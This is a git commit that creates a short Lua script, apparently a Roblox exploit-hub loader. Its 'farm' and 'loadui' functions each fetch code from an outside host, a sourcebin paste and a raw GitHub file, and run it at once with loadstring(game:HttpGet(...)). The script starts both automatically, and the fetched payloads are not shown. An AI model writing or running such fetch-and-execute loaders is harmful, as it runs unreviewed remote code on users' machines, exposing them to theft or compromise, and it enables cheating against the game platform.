996228e217c838a4134a0cdd0ae3217129274343
furkanyigit438 <furkan.yigit.naz.akyol@gmail.com>
2026-04-16 20:21:42 +0300

    Create rise.lua

---
+++ rise.lua
@@ -0,0 +1,9 @@
+local function farm()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/gBZXCz7Z0h/0", true))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furkanyigit438/mm1/refs/heads/main/risehub.lua'))()
+end
+
+task.spawn(farm)
+task.spawn(loadui)
